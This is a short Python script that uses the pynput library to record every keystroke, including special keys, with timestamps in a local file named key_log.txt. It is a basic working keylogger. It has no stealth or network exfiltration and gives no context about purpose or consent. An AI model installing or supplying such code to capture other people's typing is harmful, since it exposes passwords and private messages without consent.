from pynput import keyboard
import logging

# File to save the logs
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()